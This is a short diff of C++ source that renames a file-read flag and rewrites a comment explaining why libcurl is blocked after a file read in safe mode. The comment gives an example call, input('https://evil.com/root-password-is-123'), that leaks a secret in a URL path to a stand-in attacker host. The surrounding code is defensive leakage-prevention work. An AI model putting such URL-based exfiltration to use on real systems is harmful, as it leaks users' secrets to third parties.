@@ -347,7 +347,7 @@ bool globalRead=true;
 // Enable writing to (or changing to) other directories
 bool globalWrite=false;
 // Flag set when input() reads any file
-bool readAnyFile=false;
+bool haveReadFile=false;
 // Set true only if -curlAfterRead was explicitly given on the command line
 bool curlOverride=false;
 
@@ -356,9 +356,9 @@ bool globalread() {return globalRead || !safe;}
 
 #ifdef HAVE_LIBCURL
 // Blocking libcurl prevents DNS/log leakage: even a failed URL request
-// (e.g., input("https://evil.com/secret.txt")) exposes the URL path and
-// the user's IP address in the remote server's logs.
-bool curlEnabled() {return curlOverride || !readAnyFile;}
+// (e.g., input("https://evil.com/root-password-is-123")) exposes the URL
+// path and the user's IP address in the remote server's logs.
+bool curlEnabled() {return curlOverride || !haveReadFile;}
 #else
 bool curlEnabled() {return false;}
 #endif
